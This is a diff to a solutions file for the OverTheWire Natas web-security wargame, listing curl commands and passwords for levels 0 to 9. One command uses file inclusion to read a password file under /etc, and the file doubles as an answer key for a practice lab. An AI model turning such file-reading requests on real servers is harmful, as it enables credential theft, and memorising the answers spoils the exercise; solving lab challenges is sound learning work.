@@ -1,5 +1,6 @@
 ### Solutions
 
+```bash
 curl --silent --user natas0:natas0 http://natas0.natas.labs.overthewire.org
 
 curl --silent --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org
@@ -17,4 +18,7 @@ curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 --request POST --fo
 
 curl --silent --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
 
-natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+curl --silent --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe --request POST --form 'submit=1' --form 'secret=oubWYf2kBq' http://natas8.natas.labs.overthewire.org
+```
+
+`natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
